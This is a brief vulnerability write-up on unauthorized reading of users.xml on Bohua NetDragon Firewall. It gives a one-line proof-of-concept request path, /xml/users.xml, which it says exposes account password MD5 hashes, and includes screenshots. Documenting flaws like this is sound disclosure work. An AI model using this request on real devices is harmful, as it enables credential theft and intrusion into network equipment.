# Bohua NetDragon Firewall users.xml Unauthorized access

## Vulnerability Description

Bohua NetDragon Firewall users.xml file can be read by any user, including the logged-in account password

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Bohua NetDragon Firewall</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628670749851-c85b5406-15f0-498c-9edd-80b1eb2ac426.png)

Verify POC, read configuration file to obtain password Md5

```php
/xml/users.xml
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1628670712797-5caf4c4d-716b-4aa4-9468-d1ff8c433b66.png)


